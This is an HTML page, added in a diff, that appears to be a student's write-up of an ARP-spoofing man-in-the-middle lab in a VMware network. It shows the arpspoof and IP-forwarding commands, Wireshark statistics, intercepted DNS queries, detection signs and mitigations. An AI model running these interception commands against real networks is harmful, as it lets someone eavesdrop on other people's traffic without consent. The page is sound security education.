@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Sai Nikhith Atmakuri — ARP MITM Lab</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600&display=swap');
+
+  :root {
+    --bg: #0d0d0d;
+    --bg2: #111111;
+    --bg3: #161616;
+    --border: #1f1f1f;
+    --border2: #2a2a2a;
+    --green: #00ff41;
+    --green-dim: #00cc34;
+    --green-muted: rgba(0,255,65,0.08);
+    --green-border: rgba(0,255,65,0.15);
+    --text: #c8c8c8;
+    --text-bright: #e8e8e8;
+    --text-dim: #555;
+    --accent: #00ff41;
+    --red: #ff4444;
+    --yellow: #ffcc00;
+    --blue: #4488ff;
+    --mono: 'JetBrains Mono', 'Courier New', monospace;
+    --sans: 'Inter', system-ui, sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* SCANLINE EFFECT */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.03) 2px,
+      rgba(0,0,0,0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* NAV */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    background: rgba(13,13,13,0.95);
+    border-bottom: 1px solid var(--border2);
+    padding: 0 48px;
+    height: 48px;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .nav-id {
+    color: var(--green);
+    font-size: 12px;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+  }
+  .nav-id::before { content: '> '; color: var(--text-dim); }
+  .nav-links {
+    display: flex; gap: 32px;
+  }
+  .nav-links a {
+    color: var(--text-dim);
+    text-decoration: none;
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    transition: color 0.15s;
+  }
+  .nav-links a:hover { color: var(--green); }
+  .nav-status {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 11px; color: var(--text-dim);
+  }
+  .blink {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--green);
+    animation: blink 1.4s infinite;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+  /* HERO — TERMINAL STYLE */
+  .hero {
+    min-height: 100vh;
+    display: flex; flex-direction: column; justify-content: center;
+    padding: 80px 48px 48px;
+    border-bottom: 1px solid var(--border2);
+  }
+  .terminal-prompt {
+    color: var(--text-dim);
+    font-size: 12px;
+    margin-bottom: 32px;
+  }
+  .terminal-prompt span { color: var(--green); }
+  .hero-title {
+    font-size: clamp(28px, 5vw, 52px);
+    font-weight: 700;
+    color: var(--text-bright);
+    line-height: 1.1;
+    margin-bottom: 6px;
+    font-family: var(--mono);
+  }
+  .hero-title .hl { color: var(--green); }
+  .hero-desc {
+    font-family: var(--sans);
+    font-size: 14px;
+    color: var(--text-dim);
+    max-width: 560px;
+    margin: 20px 0 40px;
+    line-height: 1.7;
+    font-weight: 300;
+  }
+  .author-line {
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 48px;
+  }
+  .author-line span { color: var(--green); }
+
+  /* STAT ROW */
+  .stat-row {
+    display: flex; gap: 40px; flex-wrap: wrap;
+    border-top: 1px solid var(--border2);
+    padding-top: 32px;
+  }
+  .stat {
+    display: flex; flex-direction: column;
+  }
+  .stat-val {
+    font-size: 28px; font-weight: 700;
+    color: var(--green);
+    font-family: var(--mono);
+    line-height: 1;
+  }
+  .stat-key {
+    font-size: 10px; color: var(--text-dim);
+    text-transform: uppercase; letter-spacing: 1.5px;
+    margin-top: 4px;
+  }
+  .stat-sep { color: var(--border2); font-size: 24px; align-self: center; }
+
+  /* SECTIONS */
+  .section { padding: 72px 48px; border-bottom: 1px solid var(--border); }
+  .section:nth-child(odd) { background: var(--bg2); }
+
+  .section-header {
+    display: flex; align-items: baseline; gap: 16px;
+    margin-bottom: 40px;
+  }
+  .section-num { color: var(--green); font-size: 11px; font-weight: 700; }
+  .section-title {
+    font-size: 18px; font-weight: 600;
+    color: var(--text-bright); font-family: var(--sans);
+    letter-spacing: -0.3px;
+  }
+  .section-line { flex: 1; height: 1px; background: var(--border2); }
+
+  /* NETWORK MAP */
+  .net-map {
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 4px;
+    padding: 40px;
+    font-family: var(--mono);
+    overflow-x: auto;
+  }
+  .net-diagram {
+    display: flex; align-items: center; justify-content: center;
+    gap: 0; flex-wrap: wrap; gap: 8px;
+  }
+  .net-node {
+    background: var(--bg);
+    border: 1px solid var(--border2);
+    border-radius: 2px;
+    padding: 16px 20px;
+    text-align: center;
+    min-width: 160px;
+  }
+  .net-node.attacker { border-color: var(--green); }
+  .net-node.victim { border-color: #ff444444; }
+  .net-node-label { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; }
+  .net-node-label.green { color: var(--green); }
+  .net-node-label.red { color: var(--red); }
+  .net-node-label.dim { color: var(--text-dim); }
+  .net-node-name { font-size: 13px; font-weight: 700; color: var(--text-bright); margin-bottom: 4px; }
+  .net-node-ip { font-size: 11px; color: var(--text-dim); }
+  .net-node-mac { font-size: 10px; color: #333; margin-top: 2px; }
+  .net-arrow {
+    color: var(--green); font-size: 18px; padding: 0 8px;
+    align-self: center;
+  }
+
+  /* TERMINAL BLOCK */
+  .term {
+    background: #080808;
+    border: 1px solid var(--border2);
+    border-radius: 2px;
+    padding: 20px 24px;
+    margin: 12px 0;
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+  .term-bar {
+    display: flex; align-items: center; gap: 8px;
+    margin-bottom: 16px; padding-bottom: 12px;
+    border-bottom: 1px solid #1a1a1a;
+  }
+  .term-dot { width: 10px; height: 10px; border-radius: 50%; }
+  .term-label { font-size: 10px; color: var(--text-dim); margin-left: auto; text-transform: uppercase; letter-spacing: 1px; }
+  .term-line { margin: 3px 0; }
+  .term-prompt { color: var(--green); }
+  .term-cmd { color: var(--text-bright); }
+  .term-out { color: var(--text-dim); }
+  .term-warn { color: var(--yellow); }
+  .term-success { color: var(--green); }
+  .term-comment { color: #333; }
+
+  /* FLOW STEPS */
+  .steps { display: flex; flex-direction: column; gap: 0; }
+  .step {
+    display: flex; gap: 24px;
+    padding: 24px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .step:last-child { border-bottom: none; }
+  .step-num {
+    font-size: 11px; font-weight: 700; color: var(--green);
+    width: 24px; flex-shrink: 0; padding-top: 2px;
+  }
+  .step-content { flex: 1; }
+  .step-title { font-size: 13px; font-weight: 600; color: var(--text-bright); margin-bottom: 6px; font-family: var(--sans); }
+  .step-desc { font-size: 12px; color: var(--text-dim); font-family: var(--sans); margin-bottom: 10px; line-height: 1.6; }
+
+  /* TABLES */
+  .data-table { width: 100%; border-collapse: collapse; font-size: 12px; margin: 16px 0; }
+  .data-table th {
+    text-align: left; padding: 10px 14px;
+    font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px;
+    color: var(--green); font-weight: 500;
+    border-bottom: 1px solid var(--border2);
+  }
+  .data-table td {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text); font-family: var(--mono);
+    vertical-align: top;
+  }
+  .data-table tr:last-child td { border-bottom: none; }
+  .data-table tr:hover td { background: var(--green-muted); }
+  .mono { font-family: var(--mono); font-size: 11px; color: var(--text-dim); }
+  .highlight { color: var(--green); }
+  .warn { color: var(--yellow); }
+  .danger { color: var(--red); }
+
+  /* PROTOCOL BARS */
+  .proto-bars { display: flex; flex-direction: column; gap: 12px; }
+  .proto-row { display: flex; align-items: center; gap: 12px; }
+  .proto-name { width: 120px; font-size: 11px; color: var(--text-dim); flex-shrink: 0; }
+  .proto-track { flex: 1; height: 3px; background: #1a1a1a; }
+  .proto-fill { height: 100%; }
+  .proto-val { font-size: 11px; color: var(--text-dim); width: 60px; text-align: right; flex-shrink: 0; }
+
+  /* FINDINGS */
+  .findings { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 1px; background: var(--border); }
+  .finding {
+    background: var(--bg);
+    padding: 24px;
+    transition: background 0.2s;
+  }
+  .finding:hover { background: var(--bg3); }
+  .finding-status { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; font-weight: 700; }
+  .finding-status.ok { color: var(--green); }
+  .finding-status.alert { color: var(--red); }
+  .finding-status.note { color: var(--yellow); }
+  .finding-title { font-size: 13px; font-weight: 600; color: var(--text-bright); margin-bottom: 8px; font-family: var(--sans); }
+  .finding-body { font-size: 12px; color: var(--text-dim); font-family: var(--sans); line-height: 1.6; }
+
+  /* DEFENSES */
+  .defenses { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1px; background: var(--border); }
+  .defense {
+    background: var(--bg);
+    padding: 20px 24px;
+    transition: background 0.15s;
+  }
+  .defense:hover { background: var(--green-muted); }
+  .defense-id { font-size: 10px; color: var(--green); letter-spacing: 1px; margin-bottom: 8px; }
+  .defense-name { font-size: 13px; font-weight: 600; color: var(--text-bright); margin-bottom: 6px; font-family: var(--sans); }
+  .defense-desc { font-size: 11px; color: var(--text-dim); font-family: var(--sans); line-height: 1.6; }
+
+  /* FOOTER */
+  footer {
+    padding: 32px 48px;
+    border-top: 1px solid var(--border2);
+    display: flex; justify-content: space-between; align-items: center;
+    font-size: 11px; color: var(--text-dim);
+    flex-wrap: wrap; gap: 12px;
+  }
+  .footer-id { color: var(--green); font-weight: 500; }
+  .footer-tags { display: flex; gap: 12px; flex-wrap: wrap; }
+  .footer-tag { color: #2a2a2a; }
+  .footer-tag:hover { color: var(--text-dim); }
+
+  @media (max-width: 700px) {
+    nav { padding: 0 20px; }
+    .nav-links, .nav-status { display: none; }
+    .hero { padding: 72px 20px 40px; }
+    .section { padding: 48px 20px; }
+    .stat-row { gap: 24px; }
+    .net-diagram { flex-direction: column; }
+    .net-arrow { transform: rotate(90deg); }
+    footer { padding: 24px 20px; flex-direction: column; align-items: flex-start; }
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-id">sai_nikhith_atmakuri</div>
+  <div class="nav-links">
+    <a href="#setup">setup</a>
+    <a href="#attack">attack</a>
+    <a href="#analysis">analysis</a>
+    <a href="#findings">findings</a>
+    <a href="#mitigations">mitigations</a>
+  </div>
+  <div class="nav-status">
+    <div class="blink"></div>
+    lab_complete
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="terminal-prompt">
+    <span>nikhith@kali</span>:~/security-labs/arp-mitm $ ./run_lab.sh
+  </div>
+  <div class="author-line">by <span>Sai Nikhith Atmakuri</span> — Network Security Lab</div>
+  <div class="hero-title">
+    ARP Spoofing &amp;<br>
+    <span class="hl">Man-in-the-Middle</span><br>
+    Attack
+  </div>
+  <p class="hero-desc">
+    Intercepting network traffic between a Windows VM and the gateway by poisoning ARP caches on both ends — then capturing and analyzing 280,000+ packets using Wireshark.
+  </p>
+  <div class="stat-row">
+    <div class="stat"><div class="stat-val">280,525</div><div class="stat-key">packets captured</div></div>
+    <div class="stat-sep">/</div>
+    <div class="stat"><div class="stat-val">348 MB</div><div class="stat-key">data intercepted</div></div>
+    <div class="stat-sep">/</div>
+    <div class="stat"><div class="stat-val">368 s</div><div class="stat-key">duration</div></div>
+    <div class="stat-sep">/</div>
+    <div class="stat"><div class="stat-val">100%</div><div class="stat-key">mitm success</div></div>
+  </div>
+</section>
+
+<!-- SETUP -->
+<section class="section" id="setup">
+  <div class="section-header">
+    <div class="section-num">01</div>
+    <div class="section-title">Lab Setup & Network Topology</div>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="net-map">
+    <div class="net-diagram">
+      <div class="net-node victim">
+        <div class="net-node-label red">victim</div>
+        <div class="net-node-name">Windows 10</div>
+        <div class="net-node-ip">192.168.81.129</div>
+        <div class="net-node-mac">00:0c:29:e9:39:95</div>
+      </div>
+      <div class="net-arrow">⟷</div>
+      <div class="net-node attacker">
+        <div class="net-node-label green">attacker · mitm</div>
+        <div class="net-node-name">Kali Linux</div>
+        <div class="net-node-ip">192.168.81.128</div>
+        <div class="net-node-mac">00:0c:29:79:7a:8e</div>
+      </div>
+      <div class="net-arrow">⟷</div>
+      <div class="net-node">
+        <div class="net-node-label dim">gateway</div>
+        <div class="net-node-name">VMware Gateway</div>
+        <div class="net-node-ip">192.168.81.2</div>
+        <div class="net-node-mac">00:50:56:f0:63:31</div>
+      </div>
+    </div>
+  </div>
+
+  <br>
+  <table class="data-table">
+    <thead><tr><th>Host</th><th>OS</th><th>IP</th><th>MAC</th><th>Role</th></tr></thead>
+    <tbody>
+      <tr><td class="highlight">Kali Linux</td><td class="mono">Kali 2024</td><td class="mono highlight">192.168.81.128</td><td class="mono">00:0c:29:79:7a:8e</td><td class="highlight">Attacker / MITM</td></tr>
+      <tr><td>Windows 10</td><td class="mono">Windows 10</td><td class="mono">192.168.81.129</td><td class="mono">00:0c:29:e9:39:95</td><td class="danger">Victim</td></tr>
+      <tr><td>VMware GW</td><td class="mono">—</td><td class="mono">192.168.81.2</td><td class="mono">00:50:56:f0:63:31</td><td class="mono">Default Gateway</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ATTACK -->
+<section class="section" id="attack">
+  <div class="section-header">
+    <div class="section-num">02</div>
+    <div class="section-title">Attack Execution</div>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">01</div>
+      <div class="step-content">
+        <div class="step-title">Enable IP forwarding</div>
+        <div class="step-desc">Allows Kali to relay intercepted traffic to the real gateway — keeps victim's connection alive so the attack goes unnoticed.</div>
+        <div class="term">
+          <div class="term-bar">
+            <div class="term-dot" style="background:#ff5f57"></div>
+            <div class="term-dot" style="background:#ffbd2e"></div>
+            <div class="term-dot" style="background:#28c840"></div>
+            <div class="term-label">kali terminal</div>
+          </div>
+          <div class="term-line"><span class="term-prompt">root@kali:~# </span><span class="term-cmd">echo 1 > /proc/sys/net/ipv4/ip_forward</span></div>
+          <div class="term-line"><span class="term-prompt">root@kali:~# </span><span class="term-cmd">cat /proc/sys/net/ipv4/ip_forward</span></div>
+          <div class="term-line"><span class="term-success">1</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">02</div>
+      <div class="step-content">
+        <div class="step-title">Poison victim's ARP cache (Terminal 1)</div>
+        <div class="step-desc">Sends gratuitous ARP replies to Windows — telling it that Kali's MAC owns the gateway IP. All outbound traffic now goes to Kali.</div>
+        <div class="term">
+          <div class="term-bar">
+            <div class="term-dot" style="background:#ff5f57"></div>
+            <div class="term-dot" style="background:#ffbd2e"></div>
+            <div class="term-dot" style="background:#28c840"></div>
+            <div class="term-label">terminal 1</div>
+          </div>
+          <div class="term-line"><span class="term-prompt">root@kali:~# </span><span class="term-cmd">arpspoof -i eth0 -t 192.168.81.129 192.168.81.2</span></div>
+          <div class="term-line"><span class="term-out">0:c:29:79:7a:8e 0:c:29:e9:39:95 0806 42: arp reply 192.168.81.2 is-at 0:c:29:79:7a:8e</span></div>
+          <div class="term-line"><span class="term-out">0:c:29:79:7a:8e 0:c:29:e9:39:95 0806 42: arp reply 192.168.81.2 is-at 0:c:29:79:7a:8e</span></div>
+          <div class="term-line"><span class="term-out">...</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">03</div>
+      <div class="step-content">
+        <div class="step-title">Poison gateway's ARP cache (Terminal 2)</div>
+        <div class="step-desc">Sends ARP replies to the gateway — telling it that Kali's MAC owns the victim's IP. Completes the bidirectional MITM.</div>
+        <div class="term">
+          <div class="term-bar">
+            <div class="term-dot" style="background:#ff5f57"></div>
+            <div class="term-dot" style="background:#ffbd2e"></div>
+            <div class="term-dot" style="background:#28c840"></div>
+            <div class="term-label">terminal 2</div>
+          </div>
+          <div class="term-line"><span class="term-prompt">root@kali:~# </span><span class="term-cmd">arpspoof -i eth0 -t 192.168.81.2 192.168.81.129</span></div>
+          <div class="term-line"><span class="term-out">0:c:29:79:7a:8e 50:56:f0:63:31 0806 42: arp reply 192.168.81.129 is-at 0:c:29:79:7a:8e</span></div>
+          <div class="term-line"><span class="term-out">...</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">04</div>
+      <div class="step-content">
+        <div class="step-title">Verify — ARP cache on Windows</div>
+        <div class="step-desc">The Windows ARP table now shows Kali's MAC for the gateway IP. MITM is active.</div>
+        <div class="term">
+          <div class="term-bar">
+            <div class="term-dot" style="background:#ff5f57"></div>
+            <div class="term-dot" style="background:#ffbd2e"></div>
+            <div class="term-dot" style="background:#28c840"></div>
+            <div class="term-label">windows cmd</div>
+          </div>
+          <div class="term-line"><span class="term-prompt">C:\> </span><span class="term-cmd">arp -a</span></div>
+          <div class="term-line"><span class="term-out">Interface: 192.168.81.129</span></div>
+          <div class="term-line"><span class="term-out">  Internet Address      Physical Address</span></div>
+          <div class="term-line"><span class="term-warn">  192.168.81.2          00-0c-29-79-7a-8e    &lt;-- Kali's MAC! (was 00-50-56-f0-63-31)</span></div>
+          <div class="term-line"><span class="term-success">  [MITM confirmed]</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ANALYSIS -->
+<section class="section" id="analysis">
+  <div class="section-header">
+    <div class="section-num">03</div>
+    <div class="section-title">Traffic Analysis — Wireshark</div>
+    <div class="section-line"></div>
+  </div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:32px;flex-wrap:wrap;">
+    <div>
+      <div style="font-size:10px;color:var(--green);text-transform:uppercase;letter-spacing:2px;margin-bottom:16px;">Protocol Distribution</div>
+      <div class="proto-bars">
+        <div class="proto-row">
+          <div class="proto-name">QUIC / UDP</div>
+          <div class="proto-track"><div class="proto-fill" style="width:85%;background:var(--green);"></div></div>
+          <div class="proto-val">239,260</div>
+        </div>
+        <div class="proto-row">
+          <div class="proto-name">TCP</div>
+          <div class="proto-track"><div class="proto-fill" style="width:55%;background:#00aa2a;"></div></div>
+          <div class="proto-val">40,130</div>
+        </div>
+        <div class="proto-row">
+          <div class="proto-name">TLS / HTTPS</div>
+          <div class="proto-track"><div class="proto-fill" style="width:28%;background:#006616;"></div></div>
+          <div class="proto-val">8,196</div>
+        </div>
+        <div class="proto-row">
+          <div class="proto-name">DNS ⚠</div>
+          <div class="proto-track"><div class="proto-fill" style="width:10%;background:var(--yellow);"></div></div>
+          <div class="proto-val">676</div>
+        </div>
+        <div class="proto-row">
+          <div class="proto-name">ARP (spoof)</div>
+          <div class="proto-track"><div class="proto-fill" style="width:4%;background:var(--red);"></div></div>
+          <div class="proto-val">404</div>
+        </div>
+        <div class="proto-row">
+          <div class="proto-name">ICMP</div>
+          <div class="proto-track"><div class="proto-fill" style="width:2%;background:#333;"></div></div>
+          <div class="proto-val">27</div>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div style="font-size:10px;color:var(--green);text-transform:uppercase;letter-spacing:2px;margin-bottom:16px;">Intercepted DNS Queries</div>
+      <table class="data-table">
+        <thead><tr><th>Domain</th><th>Queries</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">mozilla.cloudflare-dns.com</td><td class="warn">228</td></tr>
+          <tr><td class="mono">www.google.com</td><td class="mono">6</td></tr>
+          <tr><td class="mono">youtube-ui.l.google.com</td><td class="mono">6</td></tr>
+          <tr><td class="mono">detectportal.firefox.com</td><td class="mono">6</td></tr>
+          <tr><td class="mono">www.youtube.com</td><td class="mono">4</td></tr>
+          <tr><td class="mono">youtubei.googleapis.com</td><td class="mono">4</td></tr>
+        </tbody>
+      </table>
+      <div style="margin-top:12px;padding:12px 14px;border:1px solid rgba(255,204,0,0.2);background:rgba(255,204,0,0.04);">
+        <div style="font-size:10px;color:var(--yellow);letter-spacing:1px;margin-bottom:4px;">NOTE</div>
+        <div style="font-size:11px;color:var(--text-dim);font-family:var(--sans);">HTTPS encrypts content but DNS queries expose every domain visited — plaintext even with TLS active.</div>
+      </div>
+    </div>
+  </div>
+
+  <br><br>
+  <div style="font-size:10px;color:var(--green);text-transform:uppercase;letter-spacing:2px;margin-bottom:12px;">Wireshark Duplicate ARP Alert</div>
+  <div class="term">
+    <div class="term-line"><span class="term-comment"># Wireshark flagged this automatically in the capture</span></div>
+    <div class="term-line"><span class="term-warn">Frame 412:  ARP Reply — 192.168.81.2 is at 00:0c:29:79:7a:8e</span></div>
+    <div class="term-line"><span class="term-warn">Frame 413:  ARP Reply — 192.168.81.129 is at 00:0c:29:79:7a:8e</span></div>
+    <div class="term-line"><span class="term-warn">            [duplicate use of 192.168.81.2 detected!]</span></div>
+    <div class="term-line"><span class="term-comment"># Same MAC claiming two IPs = ARP spoofing signature</span></div>
+  </div>
+</section>
+
+<!-- FINDINGS -->
+<section class="section" id="findings">
+  <div class="section-header">
+    <div class="section-num">04</div>
+    <div class="section-title">Key Findings</div>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="findings">
+    <div class="finding">
+      <div class="finding-status ok">[ OK ] confirmed</div>
+      <div class="finding-title">MITM fully achieved</div>
+      <div class="finding-body">ARP cache on Windows confirmed poisoned. All traffic routed through Kali with zero connectivity disruption to the victim.</div>
+    </div>
+    <div class="finding">
+      <div class="finding-status alert">[ ALERT ] exposure</div>
+      <div class="finding-title">DNS leaks browsing activity</div>
+      <div class="finding-body">676 DNS queries captured in plaintext — exposed every domain visited despite HTTPS encryption on the content.</div>
+    </div>
+    <div class="finding">
+      <div class="finding-status ok">[ OK ] held</div>
+      <div class="finding-title">TLS / QUIC content protected</div>
+      <div class="finding-body">YouTube video content remained encrypted. Application-layer TLS successfully protected data payload from interception.</div>
+    </div>
+    <div class="finding">
+      <div class="finding-status note">[ NOTE ] detected</div>
+      <div class="finding-title">Wireshark auto-flagged the attack</div>
+      <div class="finding-body">Duplicate IP-MAC bindings were flagged automatically — a reliable forensic indicator visible in any standard packet capture.</div>
+    </div>
+  </div>
+</section>
+
+<!-- MITIGATIONS -->
+<section class="section" id="mitigations">
+  <div class="section-header">
+    <div class="section-num">05</div>
+    <div class="section-title">Mitigations</div>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="defenses">
+    <div class="defense">
+      <div class="defense-id">DEF-01</div>
+      <div class="defense-name">Dynamic ARP Inspection</div>
+      <div class="defense-desc">Validates ARP packets against DHCP snooping table on managed switches. Blocks spoofed ARP replies at the network layer.</div>
+    </div>
+    <div class="defense">
+      <div class="defense-id">DEF-02</div>
+      <div class="defense-name">Static ARP Entries</div>
+      <div class="defense-desc">Pins critical hosts to their real MAC addresses. Cannot be overwritten by gratuitous ARP replies.</div>
+    </div>
+    <div class="defense">
+      <div class="defense-id">DEF-03</div>
+      <div class="defense-name">Encrypted DNS (DoH/DoT)</div>
+      <div class="defense-desc">Encrypts DNS queries so an active MITM cannot read which domains the victim is resolving.</div>
+    </div>
+    <div class="defense">
+      <div class="defense-id">DEF-04</div>
+      <div class="defense-name">VPN / End-to-End Encryption</div>
+      <div class="defense-desc">Encrypts all traffic so intercepted packets are unreadable regardless of MITM position.</div>
+    </div>
+    <div class="defense">
+      <div class="defense-id">DEF-05</div>
+      <div class="defense-name">IDS / Network Monitoring</div>
+      <div class="defense-desc">Monitors for duplicate ARP alerts, anomalous MAC changes, and unusual traffic patterns in real time.</div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div>
+    <div class="footer-id">Sai Nikhith Atmakuri</div>
+    <div style="margin-top:4px;">Controlled VMware Lab &nbsp;·&nbsp; Educational Use Only</div>
+  </div>
+  <div class="footer-tags">
+    <span class="footer-tag">#ARPSpoofing</span>
+    <span class="footer-tag">#MITM</span>
+    <span class="footer-tag">#KaliLinux</span>
+    <span class="footer-tag">#Wireshark</span>
+    <span class="footer-tag">#NetworkSecurity</span>
+  </div>
+</footer>
+
+</body>
+</html>
